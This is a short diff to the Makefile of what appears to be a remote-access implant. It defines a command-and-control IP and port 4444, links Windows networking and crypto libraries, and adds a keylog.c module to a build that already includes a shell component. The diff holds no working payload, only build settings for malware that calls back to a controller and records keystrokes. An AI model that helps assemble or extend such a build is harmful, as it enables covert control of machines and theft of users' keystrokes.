@@ -8,7 +8,7 @@
 C2_IP   ?= 192.168.56.104
 C2_PORT ?= 4444
 
-SRCS  = main.c aes.c crypto.c shell.c
+SRCS  = main.c aes.c crypto.c shell.c keylog.c
 FLAGS = -DCLIENT_IP=\"$(C2_IP)\" -DCLIENT_PORT=$(C2_PORT) -DWAIT_FOR_CLIENT
 LIBS  = -lws2_32 -lbcrypt
 
